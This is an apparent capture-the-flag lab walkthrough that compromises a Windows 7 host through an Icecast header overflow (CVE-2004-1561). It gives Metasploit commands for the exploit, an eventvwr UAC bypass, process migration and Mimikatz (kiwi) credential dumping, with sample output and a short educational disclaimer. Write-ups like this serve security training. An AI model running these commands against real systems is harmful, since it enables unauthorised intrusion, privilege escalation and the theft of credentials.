# Icecast Exploitation and Privilege Escalation Walkthrough

## 1. Nmap Scan

```bash
nmap -sV -sC -p- <Machine_IP>
```

### Ports Discovered:

* 135/tcp   - Microsoft Windows RPC
* 139/tcp   - NetBIOS-SSN
* 445/tcp   - Microsoft-DS (SMB)
* 3389/tcp  - RDP
* 5357/tcp  - Microsoft HTTPAPI httpd 2.0
* 8000/tcp  - Icecast streaming media server
* 49152–49160/tcp - Various Microsoft Windows RPC

### Host Info:

* OS: Windows 7 Professional SP1
* Computer name: DARK-PC

---

## 2. Exploitation Using Metasploit

### CVE-2004-1561 - Icecast Header Overflow

```bash
msfconsole
search icecast
use exploit/windows/http/icecast_header
show options
set RHOSTS <target_ip>
run
```

✅ You should get a meterpreter session.

---

## 3. Privilege Escalation

### Basic Enumeration:

```bash
getuid
sysinfo
run post/multi/recon/local_exploit_suggester
```

### Use the Suggested Exploit:

```bash
ctrl+z   # background meterpreter session
use exploit/windows/local/bypassuac_eventvwr
show options
set SESSION 1
set LHOST <your_ip>
set LPORT 4444
run
```

✅ You now have SYSTEM privileges.

```bash
getsystem
getuid
# Should return: NT AUTHORITY\SYSTEM
```

---

## 4. Migrate to Another Process

```bash
ps
migrate -N spoolsv.exe
getuid
```

---

## 5. Loot Credentials using Kiwi (Mimikatz)

```bash
load kiwi
creds_all
```

✅ You should see credentials such as:

```
User: Dark
Password: Password01!
```

---

## 🔒 Legal Disclaimer

This guide is **strictly for educational purposes**. Do not use it on systems you do not own or have permission to test.

---

## ✅ Summary

* Scanned open ports with Nmap
* Exploited Icecast via CVE-2004-1561
* Gained Meterpreter session
* Used UAC bypass via `eventvwr`
* Migrated to a stable process
* Dumped credentials using `kiwi`

You now have full SYSTEM-level access with credentials harvested.
